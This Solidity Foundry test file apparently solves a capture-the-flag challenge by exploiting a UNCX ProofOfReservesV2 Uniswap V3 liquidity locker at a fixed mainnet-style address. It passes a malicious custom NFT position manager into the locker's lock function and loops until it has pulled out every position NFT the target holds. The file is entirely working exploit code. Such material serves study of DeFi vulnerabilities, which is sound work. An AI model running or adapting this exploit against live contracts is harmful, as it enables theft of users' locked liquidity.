// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console2} from "forge-std/console2.sol";
 
import "forge-ctf/CTFDeployment.sol";
import "src/Challenge.sol";
import "./myNFTManager.sol";

import "../lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol";
import "../lib/openzeppelin-contracts/contracts/token/ERC721/extensions/IERC721Enumerable.sol";

import 'src/uniswap-updated/INonfungiblePositionManager.sol';
import 'src/UNCX_ProofOfReservesV2_UniV3.sol';
import 'src/ICountryList.sol';

import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";

contract Solve is BaseTest {
    address private immutable TARGET = 0x7f5C649856F900d15C83741f45AE46f5C6858234;
    IERC721 private immutable UNI_V3 = IERC721(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    address token = 0xFE92134da38df8c399A90a540f20187D19216E05;
    IUniswapV3Factory private UNI_FACTORY;

    ICountryList public COUNTRY_LIST;
    address public AUTO_COLLECT_ACCOUNT;
    address payable public FEE_ADDR_LP; // LP fee destination
    address payable public FEE_ADDR_COLLECT;

    function setUp() public override {
        super.setUp();
        vm.startBroadcast(system);

        challenge = address(new Challenge());

        UNI_FACTORY = IUniswapV3Factory(INonfungiblePositionManager(address(UNI_V3)).factory());
        COUNTRY_LIST = UNCX_ProofOfReservesV2_UniV3(TARGET).COUNTRY_LIST();
        AUTO_COLLECT_ACCOUNT = UNCX_ProofOfReservesV2_UniV3(TARGET).AUTO_COLLECT_ACCOUNT();
        FEE_ADDR_LP = UNCX_ProofOfReservesV2_UniV3(TARGET).FEE_ADDR_LP();
        FEE_ADDR_COLLECT = UNCX_ProofOfReservesV2_UniV3(TARGET).FEE_ADDR_COLLECT();

        deployCodeTo('UNCX_ProofOfReservesV2_UniV3.sol:UNCX_ProofOfReservesV2_UniV3', abi.encode(COUNTRY_LIST, AUTO_COLLECT_ACCOUNT, FEE_ADDR_LP, FEE_ADDR_COLLECT), TARGET);

        vm.stopBroadcast();

        vm.label(TARGET, "TARGET");
        vm.label(address(UNI_V3), "UNI_V3");
        
    }

    function test() public  {
        uint256 amount = UNI_V3.balanceOf(TARGET);
        
        UNCX_ProofOfReservesV2_UniV3.LockParams memory params;
        params.nft_id = 0;
        params.dustRecipient = address(this);
        params.owner = address(this);
        params.collectAddress = address(this);
        params.additionalCollector = address(this);
        params.unlockDate = block.timestamp + 100;
        params.feeName = "DEFAULT";
        params.countryCode = 0;
        params.r = new bytes[](0);


        myNFTManager nftManager = new myNFTManager(address(UNI_FACTORY));
        params.nftPositionManager = INonfungiblePositionManager(address(nftManager));
        
        for (uint256 i = 0; i < amount; i += 2) {
            uint256 lockTokenId1 = IERC721Enumerable(address(UNI_V3)).tokenOfOwnerByIndex(TARGET, 0);
            uint256 lockTokenId2 = IERC721Enumerable(address(UNI_V3)).tokenOfOwnerByIndex(TARGET, i+1 >= amount ? 0:1);

            nftManager.setlockTokenId(lockTokenId1, lockTokenId2);
            UNCX_ProofOfReservesV2_UniV3(TARGET).lock(params);
            
        }

        assert(validation());
    }

    function validation() internal view returns (bool) {
        return Challenge(challenge).isSolved();
    }
}
